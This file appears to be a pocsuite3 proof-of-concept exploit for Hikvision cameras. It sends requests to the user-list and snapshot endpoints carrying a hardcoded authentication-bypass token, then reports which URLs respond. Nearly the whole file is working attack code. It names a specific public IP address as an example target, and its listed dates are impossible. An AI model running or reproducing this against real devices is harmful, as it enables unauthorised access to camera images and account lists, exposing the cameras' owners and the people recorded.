#!/usr/bin/env python
# -*- coding: utf-8 -*-


from urllib.parse import urljoin
from pocsuite3.api import Output,POCBase,requests,logger,register_poc

class ByPassPoc(POCBase):
    vulID = ''
    version = '1.0'
    author = ['Totora']
    vulDate = '2019-29-25'
    createDate = '2019-29-25'
    name = 'hikvision info disclosure'
    appName = 'hikvision'
    appVersion = ''
    vulType = 'info-disclosure'
    example = 'http://46.19.226.157:5601'

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


    def _verify(self):
        path_users = '/Security/users?auth=YWRtaW46MTEK'
        path_snapshot = '/onvif-http/snapshot?auth=YWRtaW46MTEK'
        url_users = urljoin(self.url,path_users)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'
        }
        result = {}
        urls  = []
        try:
            res = requests.get(url_users,headers=headers)
            if res.status_code == 200:
                urls.append(url_users)
            else:
                logger.info('GET USER Fail:'+str(res.status_code))
        except:
            logger.info('GET USER FAIL')
        url_snapshot = urljoin(self.url,path_snapshot)
        try:
            res = requests.get(url_snapshot,headers=headers)
            if res.status_code == 200:
                urls.append(url_snapshot)
            else:
                logger.info('GET SNAPSHOT Fail:'+str(res.status_code))    
        except:
            logger.info('GET SNAPSHOT FAIL')
        if urls:
            logger.info('hikvision reset password tool to reset password')
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Target'] = self.url
            result['VerifyInfo']['URL'] = ','.join(urls)
        return self.parse_output(result)
    def _attack(self):
        return self._verify()

register_poc(ByPassPoc)
